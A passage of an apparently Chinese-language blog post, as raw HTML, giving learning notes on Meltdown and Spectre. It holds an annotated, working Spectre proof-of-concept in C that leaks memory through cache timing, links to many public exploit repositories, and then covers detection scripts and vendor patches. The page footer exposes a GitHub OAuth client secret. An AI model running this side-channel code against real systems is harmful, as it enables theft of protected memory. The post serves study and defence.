ASCII 码表</span></span><br><span class="line">    <span class="keyword">int</span> tries, i, j, k, mix_i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> junk = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> training_x, x;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">uint64_t</span> time1, time2;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint8_t</span> *addr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        results[i] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*每个字符多次尝试获取以增加成功率*/</span></span><br><span class="line">    <span class="keyword">for</span> (tries = __TRYTIMES; tries &gt; <span class="number">0</span>; tries--) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*清空 array2 的每 512 字节首地址 cache*/</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">            _mm_clflush(&amp;array2[i * <span class="number">512</span>]); <span class="comment">// _mm_clflush：Invalidate and flush the cache line that contains p from all levels of the cache hierarchy</span></span><br><span class="line"> </span><br><span class="line">        training_x = tries % array1_size;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*训练 CPU 缓存需要的数据*/</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            _mm_clflush(&amp;array1_size); <span class="comment">// 清空array1_size的缓存</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*100 次内存取值用作延时，确保 cache 页全部换出*/</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">volatile</span> <span class="keyword">int</span> z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123;&#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                在这一步:</span></span><br><span class="line"><span class="comment">                j % 6 =  0 则 x = 0xFFFF0000</span></span><br><span class="line"><span class="comment">                j % 6 != 0 则 x = 0x00000000</span></span><br><span class="line"><span class="comment">                Avoid jumps in case those tip off the branch predictor</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            x = ((j % <span class="number">6</span>) - <span class="number">1</span>) &amp; ~<span class="number">0xFFFF</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                到这里:</span></span><br><span class="line"><span class="comment">                j % 6 =  0 则 x = 0xFFFFFFFF</span></span><br><span class="line"><span class="comment">                j % 6 != 0 则 x = 0x00000000</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            x = (x | (x &gt;&gt; <span class="number">16</span>));</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                最后:</span></span><br><span class="line"><span class="comment">                j % 6 =  0 则 x = malicious_x</span></span><br><span class="line"><span class="comment">                j % 6 != 0 则 x = training_x</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            x = training_x ^ (x &amp; (malicious_x ^ training_x));</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                调用触发 cache 代码</span></span><br><span class="line"><span class="comment">                共计触发 5 次，j = 24、18、12、6、0时，都会触发分支预测</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            victim_function(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*退出此函数时 cache 中已经缓存了需要越权获取的数据*/</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            读取时间。执行顺序轻微混淆防止 stride prediction（某种分支预测方法）</span></span><br><span class="line"><span class="comment">            i 取值 0 - 255 对应 ASCII 码表</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                <span class="doctag">TODO:</span> 贼NB的数学游戏，值得叫 666</span></span><br><span class="line"><span class="comment">                167  0xA7  1010 0111</span></span><br><span class="line"><span class="comment">                13   0x0D  0000 1101</span></span><br><span class="line"><span class="comment">                取值结果为 0 - 255 随机数且不重复</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            mix_i = ((i * <span class="number">167</span>) + <span class="number">13</span>) &amp; <span class="number">255</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*addr 取 arrary2 中 0-255 组的首地址*/</span></span><br><span class="line">            addr = &amp;array2[mix_i * <span class="number">512</span>];</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*junk 保存 TSC_AUX 寄存器值，time1 保存当前时间戳*/</span></span><br><span class="line">            time1 = __rdtscp(&amp;junk);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*获取数据，用以测试时间*/</span></span><br><span class="line">            junk = *addr;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*记录并获取耗时*/</span></span><br><span class="line">            time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*判断是否命中，且 mix_i 不能取 1 - 16，因为 1 - 16 在获取时是无效的*/</span></span><br><span class="line">            <span class="keyword">if</span> (time2 &lt;= iThreshold &amp;&amp; mix_i != array1[tries % array1_size])</span><br><span class="line">                <span class="comment">/*cache arrary2中的 0-255 项命中则 +1 分*/</span></span><br><span class="line">                results[mix_i]++;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*获取分组中命中率最高的两个分组，分别存储在 j(最高命中),k（次高命中）里*/</span></span><br><span class="line">        j = k = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; <span class="number">0</span> || results[i] &gt;= results[j]) &#123;</span><br><span class="line">                k = j;</span><br><span class="line">                j = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (k &lt; <span class="number">0</span> || results[i] &gt;= results[k]) &#123;</span><br><span class="line">                k = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            最高命中项命中次数大于 2 倍加 5 的次高命中项次数</span></span><br><span class="line"><span class="comment">            或</span></span><br><span class="line"><span class="comment">            仅仅最高命中项命中 2 次</span></span><br><span class="line"><span class="comment">            则</span></span><br><span class="line"><span class="comment">            退出循环，成功找到命中项</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (results[j] &gt;= (<span class="number">2</span> * results[k] + <span class="number">5</span>) || (results[j] == <span class="number">2</span> &amp;&amp; results[k] == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">/* Clear success if best is &gt; 2*runner-up + 5 or 2/0) */</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*使用 junk 防止优化输出*/</span></span><br><span class="line">    results[<span class="number">0</span>] ^= junk;</span><br><span class="line">    value[<span class="number">0</span>] = (<span class="keyword">uint8_t</span>)j;<span class="comment">//最高命中项</span></span><br><span class="line">    score[<span class="number">0</span>] = results[j];<span class="comment">//最高命中项命中次数</span></span><br><span class="line">    value[<span class="number">1</span>] = (<span class="keyword">uint8_t</span>)k;<span class="comment">//次高命中项</span></span><br><span class="line">    score[<span class="number">1</span>] = results[k];<span class="comment">//次高命中项命中次数</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> malicious_x = (<span class="keyword">size_t</span>)(secret - (<span class="keyword">char</span>*)array1); <span class="comment">/* 相对地址 */</span></span><br><span class="line">    <span class="keyword">int</span> i, score[<span class="number">2</span>], iLen = __MAGICWORDSCOUNT, iCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *opt, *addr;</span><br><span class="line">    <span class="keyword">uint8_t</span> value[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Provide by CSZQ\n"</span>);</span><br><span class="line">    <span class="comment">/*参数解析*/</span></span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        opt = (<span class="keyword">char</span>*)&amp;argv[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">switch</span> (*opt) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"-h  help\n-t 设置阀值，建议取值 16 - 176 之间，默认 50\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">            <span class="keyword">if</span> (argc==<span class="number">2</span>) &#123;</span><br><span class="line">                <span class="built_in">sscanf</span>(opt + <span class="number">1</span>, <span class="string">"%d"</span>, &amp;iThreshold);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">sscanf</span>(argv[<span class="number">2</span>], <span class="string">"%d"</span>, &amp;iThreshold);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(array2); i++)</span><br><span class="line">        array2[i] = <span class="number">1</span>; <span class="comment">/* 避免写时复制 */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DEBUG &gt; 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reading %d bytes:\n"</span>, iLen);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    i = iLen;</span><br><span class="line">    <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DEBUG &gt; 0</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"读取地址：%p "</span>, (<span class="keyword">void</span>*)malicious_x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">        readMemoryByte(malicious_x++, value, score);</span><br><span class="line">        addr = (<span class="keyword">char</span>*)array1 + malicious_x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (value[<span class="number">0</span>] == *addr) &#123;</span><br><span class="line">            iCount += (score[<span class="number">0</span>] &gt; <span class="number">2</span> * score[<span class="number">1</span>]) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DEBUG &gt; 0</span></span><br><span class="line">        <span class="comment">/*如果最高命中项命中次数大于等于 2 倍的次高命中项，认为分支预测成功*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s: "</span>, (score[<span class="number">0</span>] &gt;= <span class="number">2</span> * score[<span class="number">1</span>] ? <span class="string">"成功"</span> : <span class="string">"...."</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"value:0x%02X char=%c counts=%d "</span>, value[<span class="number">0</span>],</span><br><span class="line">            ((value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span>) ? (<span class="keyword">char</span>)value[<span class="number">0</span>] : <span class="string">'?'</span>), score[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (score[<span class="number">1</span>] &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(可能:value:0x%02X char=%c counts=%d)"</span>, value[<span class="number">1</span>], ((value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span>) ? (<span class="keyword">char</span>)value[<span class="number">0</span>] : <span class="string">'?'</span>), score[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*命中次数超过 1/5 认为存在BUG，过低有可能是巧合或阀值需要调整*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\r\n"</span>, (iCount &gt;= __MAGICWORDSCOUNT / <span class="number">5</span>) ? <span class="string">"---&gt;存在BUG！！!&lt;---"</span> : <span class="string">"---&gt;不存在BUG&lt;---"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d 阀值下命中率为:%d / %d\r\n"</span>, iThreshold, iCount, iLen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"按任意键退出程序...\r\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2Window平台测试："><a href="#2-2Window平台测试：" class="headerlink" title="2.2Window平台测试："></a>2.2Window平台测试：</h4><ul>
+<li>操作系统：Windows 7 sp1</li>
+<li>编译器：vs2015</li>
+<li>编译好的poc：<a href="spectre_win_poc.rar">spectre_win_poc.rar</a></li>
+</ul>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/Windows_poc.png" alt="Windwos平台复现"></p>
+<h4 id="2-3Linux平台测试："><a href="#2-3Linux平台测试：" class="headerlink" title="2.3Linux平台测试："></a>2.3Linux平台测试：</h4><ul>
+<li>操作系统：kali1 (2016-07-21) x86_64</li>
+<li>编译器：gcc 6.3.0</li>
+</ul>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/Linux_poc.gif" alt="Linux平台复现"></p>
+<h4 id="2-4其他poc汇总"><a href="#2-4其他poc汇总" class="headerlink" title="2.4其他poc汇总"></a>2.4其他poc汇总</h4><p>目前网上有很多poc，大家可以下去好好测试一下，最好认真研究大牛们写的代码。</p>
+<p><a href="https://github.com/HarsaroopDhillon/SpectreExploit" target="_blank" rel="noopener">https://github.com/HarsaroopDhillon/SpectreExploit</a></p>
+<p><a href="https://github.com/turbo/KPTI-PoC-Collection" target="_blank" rel="noopener">https://github.com/turbo/KPTI-PoC-Collection</a></p>
+<p>处理器漏洞 Metldown Poc: 从 Google Chrome 中读取密码</p>
+<p><a href="https://github.com/RealJTG/Meltdown`" target="_blank" rel="noopener">https://github.com/RealJTG/Meltdown`</a></p>
+<p>AArch64 硬件平台Spectre PoC（从用户模式读取所有的 ARM 系统寄存器）</p>
+<p><a href="https://github.com/lgeek/spec_poc_arm" target="_blank" rel="noopener">https://github.com/lgeek/spec_poc_arm</a></p>
+<p>spectre meltdown poc</p>
+<p><a href="https://github.com/mniip/spectre-meltdown-poc" target="_blank" rel="noopener">https://github.com/mniip/spectre-meltdown-poc</a></p>
+<p>检查 Linux 主机是否受处理器漏洞Spectre &amp; Meltdown 的影响</p>
+<p><a href="https://github.com/speed47/spectre-meltdown-checker" target="_blank" rel="noopener">https://github.com/speed47/spectre-meltdown-checker</a></p>
+<p>Meltdown exploit</p>
+<p><a href="https://github.com/paboldin/meltdown-exploit" target="_blank" rel="noopener">https://github.com/paboldin/meltdown-exploit</a></p>
+<p>Meltdown PoC</p>
+<p><a href="https://github.com/GitMirar/meltdown-poc" target="_blank" rel="noopener">https://github.com/GitMirar/meltdown-poc</a></p>
+<p>Metldown PoC 收集. 当前包括2个视频, 5个Demo</p>
+<p><a href="https://github.com/IAIK/meltdown/" target="_blank" rel="noopener">https://github.com/IAIK/meltdown/</a></p>
+<h2 id="0x03漏洞检测"><a href="#0x03漏洞检测" class="headerlink" title="0x03漏洞检测"></a>0x03漏洞检测</h2><h4 id="3-1Windows平台"><a href="#3-1Windows平台" class="headerlink" title="3.1Windows平台"></a>3.1Windows平台</h4><p>微软官方出了一个Powershell检测脚本，有两个安装方法，大家自行根据自己的系统和WMF版本来选择合适的方法。</p>
+<h5 id="3-1-1方法一"><a href="#3-1-1方法一" class="headerlink" title="3.1.1方法一"></a>3.1.1方法一</h5><p>适合Windows Server 2016或者WMF版本是5.0/5.1</p>
+<h6 id="（1）安装PowerShell模块"><a href="#（1）安装PowerShell模块" class="headerlink" title="（1）安装PowerShell模块"></a>（1）安装PowerShell模块</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; Install-Module SpeculationControl</span><br></pre></td></tr></table></figure>
+
+<h6 id="（2）运行验证模块"><a href="#（2）运行验证模块" class="headerlink" title="（2）运行验证模块"></a>（2）运行验证模块</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; <span class="comment"># Save the current execution policy so it can be reset</span></span><br><span class="line">PS&gt; <span class="variable">$SaveExecutionPolicy</span> = <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> RemoteSigned -Scope Currentuser</span><br><span class="line">PS&gt; <span class="built_in">Import-Module</span> SpeculationControl</span><br><span class="line">PS&gt; Get-SpeculationControlSettings</span><br><span class="line">PS&gt; <span class="comment"># Reset the execution policy to the original state</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> <span class="variable">$SaveExecutionPolicy</span> -Scope Currentuser</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-1-2方法二"><a href="#3-1-2方法二" class="headerlink" title="3.1.2方法二"></a>3.1.2方法二</h5><p>适合系统版本或WMF版本比较老</p>
+<h6 id="（1）下载并解压好脚本"><a href="#（1）下载并解压好脚本" class="headerlink" title="（1）下载并解压好脚本"></a>（1）下载并解压好脚本</h6><p>脚本下载地址：<a href="https://aka.ms/SpeculationControlPS" target="_blank" rel="noopener">https://aka.ms/SpeculationControlPS</a></p>
+<h6 id="（2）导入并执行验证模块"><a href="#（2）导入并执行验证模块" class="headerlink" title="（2）导入并执行验证模块"></a>（2）导入并执行验证模块</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; <span class="comment"># Save the current execution policy so it can be reset</span></span><br><span class="line">PS&gt; <span class="variable">$SaveExecutionPolicy</span> = <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> RemoteSigned -Scope Currentuser</span><br><span class="line">PS&gt; CD 解压脚本目录</span><br><span class="line">PS&gt; <span class="built_in">Import-Module</span> .\SpeculationControl.psd1</span><br><span class="line">PS&gt; Get-SpeculationControlSettings</span><br><span class="line">PS&gt; <span class="comment"># Reset the execution policy to the original state</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> <span class="variable">$SaveExecutionPolicy</span> -Scope Currentuser</span><br></pre></td></tr></table></figure>
+
+<p>我本机是win7系统，所以选用第二种方法。但在导入验证模块时出错了。</p>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/PowerShell_error.png" alt="导入报错"></p>
+<p>这是因为Win7系统默认是Powershell是2.0，得升级版本。我升级到了PowerShell 4.0版本后，就可以成功导入模块并检测了。</p>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/PowerShell_check.png" alt="检查成功"></p>
+<h4 id="3-2Linux平台"><a href="#3-2Linux平台" class="headerlink" title="3.2Linux平台"></a>3.2Linux平台</h4><p>Linux平台可以使用github上的一个检测脚本。</p>
+<p>github地址：<code>https://github.com/raphaelsc/Am-I-affected-by-Meltdown</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/raphaelsc/Am-I-affected-by-Meltdown.git</span><br><span class="line"><span class="built_in">cd</span> ./Am-I-affected-by-Meltdown</span><br><span class="line">make</span><br><span class="line">./meltdown-checker</span><br></pre></td></tr></table></figure>
+
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/am_i_affected_by_meltdown.png" alt="存在风险"></p>
+<h2 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h2><h4 id="4-1Windows操作系统（7-8-10）和Microsoft-Edge-IE"><a href="#4-1Windows操作系统（7-8-10）和Microsoft-Edge-IE" class="headerlink" title="4.1Windows操作系统（7/8/10）和Microsoft Edge/IE"></a>4.1Windows操作系统（7/8/10）和Microsoft Edge/IE</h4><p>下载地址：<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4056892" target="_blank" rel="noopener">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4056892</a></p>
+<h4 id="4-2火狐浏览器"><a href="#4-2火狐浏览器" class="headerlink" title="4.2火狐浏览器"></a>4.2火狐浏览器</h4><p>Mozilla发布了Firefox版本57.0.4，其中包括针对Spectre（幽灵）和Meltdown（熔毁）攻击的缓解措施。建议用户尽快更新安装。</p>
+<p>下载链接为：<a href="https://www.mozilla.org/en-US/security/advisories/mfsa2018-01/" target="_blank" rel="noopener">https://www.mozilla.org/en-US/security/advisories/mfsa2018-01/</a></p>
+<h4 id="4-3Google-Chrome浏览器"><a href="#4-3Google-Chrome浏览器" class="headerlink" title="4.3Google Chrome浏览器"></a>4.3Google Chrome浏览器</h4><h4 id="4-4Linux"><a href="#4-4Linux" class="headerlink" title="4.4Linux"></a>4.4Linux</h4><p>Linux内核开发者还发布了Linux内核的补丁。包括版本：4.14.11，4.9.74，4.4.109，3.16.52，3.18.91，3.2.97</p>
+<p>下载链接：<a href="https://www.kernel.org/" target="_blank" rel="noopener">https://www.kernel.org/</a></p>
+<p>（1）RedHat已发布补丁</p>
+<p><a href="https://access.redhat.com/security/vulnerabilities/speculativeexecution?sc_cid=701f2000000tsLNAAY" target="_blank" rel="noopener">https://access.redhat.com/security/vulnerabilities/speculativeexecution?sc_cid=701f2000000tsLNAAY</a></p>
+<p>（2）Ubuntu：已提供修复补丁</p>
+<p><a href="https://insights.ubuntu.com/2018/01/04/ubuntu-updates-for-the-meltdown-spectre-vulnerabilities/" target="_blank" rel="noopener">https://insights.ubuntu.com/2018/01/04/ubuntu-updates-for-the-meltdown-spectre-vulnerabilities/</a></p>
+<p>（3）SUSE：已陆续发布补丁</p>
+<p><a href="https://www.suse.com/support/kb/doc/?id=7022512" target="_blank" rel="noopener">https://www.suse.com/support/kb/doc/?id=7022512</a></p>
+<h4 id="4-5VMware"><a href="#4-5VMware" class="headerlink" title="4.5VMware"></a>4.5VMware</h4><p><a href="https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html" target="_blank" rel="noopener">https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html</a></p>
+<h2 id="0x05参考资料"><a href="#0x05参考资料" class="headerlink" title="0x05参考资料"></a>0x05参考资料</h2><p><a href="http://www.antiy.com/response/Meltdown.html#_motz_" target="_blank" rel="noopener">处理器A级漏洞Meltdown(熔毁)和Spectre(幽灵)分析报告</a></p>
+<p><a href="https://bbs.pediy.com/thread-223836.htm" target="_blank" rel="noopener">通俗理解这次的CPU漏洞</a></p>
+<p><a href="https://bbs.pediy.com/thread-223824.htm" target="_blank" rel="noopener">最近比较火的CPU漏洞解析，附带修改过带注释源码一份</a></p>
+<p><a href="http://www.hackliu.com/?p=187" target="_blank" rel="noopener">CPU特性漏洞测试POC(Meltdown and Spectre)</a></p>
+
+  </div>
+</article>
+
+
+
+
+
+
+    <link rel="stylesheet" href="https://unpkg.com/vssue/dist/vssue.min.css">
+<div id="vssue"></div>
+<script src="https://unpkg.com/vue/dist/vue.runtime.min.js"></script>
+<script src="https://unpkg.com/vssue/dist/vssue.github.min.js"></script>
+<!-- <script src="https://unpkg.com/vssue/dist/vssue.github-v4.min.js"></script> -->
+<script>
+    new Vue({
+      el: '#vssue',
+      render: h => h('Vssue', {
+        props: {
+          title: 'Meltdown和Spectre漏洞学习笔记',
+          options: {
+            owner: 'ws4',
+            repo: 'ws4.github.io',
+            clientId: 'e47c5d37e969e470f60b',
+            clientSecret: '82b90182f62c79794f62979f6841b4199281b01d',
+          },
+        }
+      })
+    })
+</script>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://github.com/c0ny1/">项目</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/gossip">闲言碎语</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">0x01漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1CPU缓存验证缺陷"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.1CPU缓存验证缺陷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2边信道攻击缓存"><span class="toc-number">1.0.2.</span> <span class="toc-text">1.2边信道攻击缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3通俗理解"><span class="toc-number">1.0.3.</span> <span class="toc-text">1.3通俗理解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">0x02漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1poc代码注释"><span class="toc-number">2.0.1.</span> <span class="toc-text">2.1poc代码注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2Window平台测试："><span class="toc-number">2.0.2.</span> <span class="toc-text">2.2Window平台测试：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3Linux平台测试："><span class="toc-number">2.0.3.</span> <span class="toc-text">2.3Linux平台测试：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4其他poc汇总"><span class="toc-number">2.0.4.</span> <span class="toc-text">2.4其他poc汇总</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03漏洞检测"><span class="toc-number">3.</span> <span class="toc-text">0x03漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1Windows平台"><span class="toc-number">3.0.1.</span> <span class="toc-text">3.1Windows平台</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-1方法一"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">3.1.1方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#（1）安装PowerShell模块"><span class="toc-number">3.0.1.1.1.</span> <span class="toc-text">（1）安装PowerShell模块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#（2）运行验证模块"><span class="toc-number">3.0.1.1.2.</span> <span class="toc-text">（2）运行验证模块</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-2方法二"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">3.1.2方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#（1）下载并解压好脚本"><span class="toc-number">3.0.1.2.1.</span> <span class="toc-text">（1）下载并解压好脚本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#（2）导入并执行验证模块"><span class="toc-number">3.0.1.2.2.</span> <span class="toc-text">（2）导入并执行验证模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2Linux平台"><span class="toc-number">3.0.2.</span> <span class="toc-text">3.2Linux平台</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04漏洞修复"><span class="toc-number">4.</span> <span class="toc-text">0x04漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1Windows操作系统（7-8-10）和Microsoft-Edge-IE"><span class="toc-number">4.0.1.</span> <span class="toc-text">4.1Windows操作系统（7/8/10）和Microsoft Edge/IE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2火狐浏览器"><span class="toc-number">4.0.2.</span> <span class="toc-text">4.2火狐浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3Google-Chrome浏览器"><span class="toc-number">4.0.3.</span> <span class="toc-text">4.3Google Chrome浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4Linux"><span class="toc-number">4.0.4.</span> <span class="toc-text">4.4Linux</span></a></li><li class="toc-item 